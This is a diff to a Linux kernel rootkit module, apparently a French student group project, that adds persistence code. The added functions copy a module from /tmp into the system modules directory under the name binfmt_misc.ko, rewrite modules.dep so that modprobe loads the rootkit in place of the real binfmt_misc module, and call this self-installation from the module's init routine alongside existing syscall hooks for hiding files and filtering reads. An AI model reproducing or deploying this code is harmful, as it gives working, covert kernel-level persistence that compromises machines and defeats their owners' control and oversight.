@@ -4,12 +4,20 @@
 #include <linux/miscdevice.h>
 #include <linux/fs.h>
 #include <linux/uaccess.h>
+#include <linux/path.h>
+#include <linux/utsname.h>
+#include <linux/vmalloc.h>
+#include <linux/slab.h>
+#include <linux/string.h>
 #include "rootkit.h"
+
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Groupe 4");
 MODULE_DESCRIPTION("Developpement d'un rootkit de base pour Linux");
 MODULE_VERSION("1.0");
+
+#define PERSIST_DIR "updates"
 
 /**
  * The struct ftrace_hook represents a hook for function tracing in C programming.
@@ -125,6 +133,235 @@ static asmlinkage long new_getdents64(const struct pt_regs *regs)
     return ret;
 }
 
+
+
+
+/**
+ * @brief Copie le contenu d'un fichier source vers un fichier destination en espace noyau.
+ *
+ * @details Utilise filp_open avec un cast __user pour contourner les restrictions
+ *          SMAP/PAN de ce kernel spécifique (file_open_name n'étant pas exporté).
+ *
+ * @param src_path  Chemin absolu du fichier source.
+ * @param dst_path  Chemin absolu du fichier de destination.
+ *
+ * @return 0         Succès.
+ * @return -ENOMEM   Erreur mémoire.
+ * @return -ENOENT   Fichier introuvable.
+ * @return -EIO      Erreur I/O.
+ */
+
+static int copy_file_kernel(const char *src_path, const char *dst_path)
+{
+    struct file *src_file = NULL;
+    struct file *dst_file = NULL;
+    loff_t src_pos = 0;
+    loff_t dst_pos = 0;
+    long ret = 0;
+    char *buf;
+    ssize_t bytes_read;
+
+    pr_info("rootkit: Copie %s -> %s\n", src_path, dst_path);
+
+    buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
+    if (!buf)
+        return -ENOMEM;
+
+    /* Vérifier que le fichier source existe */
+    src_file = filp_open(src_path, O_RDONLY, 0);
+    if (IS_ERR(src_file)) {
+        ret = PTR_ERR(src_file);
+        pr_err("rootkit: Erreur ouverture SOURCE (%ld): %s\n", ret, src_path);
+        goto out;
+    }
+
+    /* Ouvrir/Créer le fichier destination avec O_EXCL pour voir l'erreur exacte */
+    dst_file = filp_open(dst_path, O_WRONLY | O_CREAT | O_EXCL, 0644);
+    if (IS_ERR(dst_file)) {
+        ret = PTR_ERR(dst_file);
+        pr_err("rootkit: Erreur ouverture DEST (%ld): %s\n", ret, dst_path);
+        
+        /* Essayer avec O_TRUNC si le fichier existe déjà */
+        if (ret == -EEXIST) {
+            pr_info("rootkit: Fichier existe déjà, tentative de écrasement...\n");
+            dst_file = filp_open(dst_path, O_WRONLY | O_TRUNC, 0644);
+            if (IS_ERR(dst_file)) {
+                ret = PTR_ERR(dst_file);
+                pr_err("rootkit: Échec ouverture DEST (err=%ld)\n", ret);
+                goto out;
+            }
+        } else {
+            goto out;
+        }
+    }
+
+    /* Boucle de copie */
+    while ((bytes_read = kernel_read(src_file, buf, PAGE_SIZE, &src_pos)) > 0) {
+        ssize_t written = kernel_write(dst_file, buf, bytes_read, &dst_pos);
+        if (written != bytes_read) {
+            ret = -EIO;
+            pr_err("rootkit: Erreur écriture (lu=%zd, écrit=%zd)\n", 
+                   bytes_read, written);
+            break;
+        }
+    }
+
+    if (bytes_read < 0) {
+        ret = bytes_read;
+        pr_err("rootkit: Erreur lecture (err=%zd)\n", bytes_read);
+    } else if (ret == 0) {
+        pr_info("rootkit: Copie réussie\n");
+    }
+
+out:
+    if (!IS_ERR_OR_NULL(dst_file))
+        filp_close(dst_file, NULL);
+    if (!IS_ERR_OR_NULL(src_file))
+        filp_close(src_file, NULL);
+    kfree(buf);
+    return ret;
+}
+
+
+
+/**
+ * @brief Altère la base de données de dépendances des modules (modules.dep).
+ *
+ * @details La fonction lit le fichier /lib/modules/<version>/modules.dep,
+ *          supprime toute référence au module cible (ex: binfmt_misc),
+ *          et insère une entrée pointant vers le module malveillant.
+ *          Cela permet de rediriger les appels modprobe vers le module de l'attaquant.
+ *
+ * @note L'opération est destructrice : le fichier est réécrit entièrement (O_TRUNC).
+ * @note L'analyse est basée sur une simple recherche de sous-chaîne ("binfmt_misc").
+ */
+static void fake_depmod(void)
+{
+    struct file *file;
+    char *buf, *new_buf;
+    loff_t pos = 0;
+    struct new_utsname *uts;
+    char path_dep[256];
+    char my_line[256];
+    long file_size;
+    int new_pos = 0;
+    int i;
+
+    uts = utsname();
+    if (!uts) return;
+
+    snprintf(path_dep, sizeof(path_dep), "/lib/modules/%s/modules.dep", uts->release);
+
+    // 1. Lire modules.dep
+    file = filp_open(path_dep, O_RDONLY, 0);
+    if (IS_ERR(file)) {
+        pr_err("rootkit: Impossible d'ouvrir %s\n", path_dep);
+        return;
+    }
+    
+    file_size = vfs_llseek(file, 0, SEEK_END);
+    vfs_llseek(file, 0, SEEK_SET);
+    
+    buf = vmalloc(file_size + 4096); 
+    if (!buf) { filp_close(file, NULL); return; }
+    
+    kernel_read(file, buf, file_size, &pos);
+    filp_close(file, NULL);
+
+
+    // 2. Filtrer (Enlever binfmt_misc)
+    new_buf = kmalloc(file_size + 4096, GFP_KERNEL);
+    if (!new_buf) { vfree(buf); return; }
+
+    char *line_start = buf;
+    char *line_end;
+    
+    for (i = 0; i < file_size; i++) {
+        line_end = strchr(line_start, '\n');
+        if (!line_end) break;
+ 
+        *line_end = '\0';
+        if (strstr(line_start, "binfmt_misc") == NULL) {
+            int len = strlen(line_start) + 1; 
+            memcpy(new_buf + new_pos, line_start, len);
+            new_pos += len;
+            new_buf[new_pos - 1] = '\n';
+        }
+ 
+        *line_end = '\n';
+        i += (line_end - line_start);
+        line_start = line_end + 1;
+    }
+
+    // 3. Ajouter notre ligne (Hijacking)
+    snprintf(my_line, sizeof(my_line), "%s/binfmt_misc.ko:\n", PERSIST_DIR);
+    memcpy(new_buf + new_pos, my_line, strlen(my_line));
+    new_pos += strlen(my_line);
+
+    // 4. Écraser modules.dep
+    file = filp_open(path_dep, O_WRONLY | O_TRUNC, 0644);
+    if (!IS_ERR(file)) {
+        pos = 0;
+        kernel_write(file, new_buf, new_pos, &pos);
+        filp_close(file, NULL);
+        pr_info("rootkit: modules.dep modifié -> pointe vers /updates/binfmt_misc.ko\n");
+    } else {
+        pr_err("rootkit: Erreur écriture %s\n", path_dep);
+    }
+
+    kfree(new_buf);
+    vfree(buf);
+}
+
+/**
+ * @brief Assure la persistance et l'auto-réparation du module rootkit.
+ *
+ * @details Cette fonction implémente une logique idempotente :
+ *          1. Vérifie si le module malveillant est déjà installé à sa destination.
+ *          2. Si absent, tente de le copier depuis une source statique.
+ *          3. Met à jour les dépendances système (modules.dep).
+ *
+ * @note Source statique : La fonction s'attend à ce que le fichier source existe.
+ *       Si le fichier source est supprimé, l'auto-réparation échouera.
+ * @note Cette fonction doit être appelée à l'initialisation du module (rootkit_init).
+ */
+static void self_propagate(void) 
+{
+    char src_path[256];
+    char dst_path[256];
+    struct new_utsname *uts;
+    struct file *f;
+    long ret;
+
+    uts = utsname();
+    if (!uts) return;
+
+    // Source : Chemin local de l'archive (Attention : Chemin en dur)
+    snprintf(src_path, sizeof(src_path), "/tmp/rk_test.ko");
+    
+    // Destination : Chemin système où le module doit être caché
+    snprintf(dst_path, sizeof(dst_path), "/lib/modules/%s/%s/binfmt_misc.ko", uts->release, PERSIST_DIR);
+
+    // Idempotence : Vérification de la présence avant action
+    f = filp_open(dst_path, O_RDONLY, 0);
+    if (!IS_ERR(f)) {
+        pr_info("rootkit: Déjà présent dans /updates/. Rien à faire.\n");
+        filp_close(f, NULL);
+        return;
+    }
+
+    pr_info("rootkit: Installation... %s -> %s\n", src_path, dst_path);
+
+    // Copie physique du module
+    ret = copy_file_kernel(src_path, dst_path);
+    
+    if (ret == 0) {
+        pr_info("rootkit: Copie OK. Mise à jour des dépendances.\n");
+        fake_depmod(); 
+    } else {
+        pr_err("rootkit: Échec copie (%ld). Le fichier source existe-t-il ?\n", ret);
+    }
+}
 /**
  * @brief   Replaces the sys_read syscall to filter data read
  *          by userspace processes.
@@ -355,7 +592,6 @@ static int install_hook(void)
     }
 
     install_read_hook(lookup);
-
     return 0;
 }
 
@@ -610,12 +846,14 @@ static int __init rootkit_init(void)
 
     ret = install_hook();
 
+    self_propagate();
+
+    
     if (ret)
     {
         misc_deregister(&rk_misc);
         return ret;
     }
-
     printk(KERN_INFO "rootkit: loaded — /dev/rootkit (minor=%d)\n",
            rk_misc.minor);
     return 0;
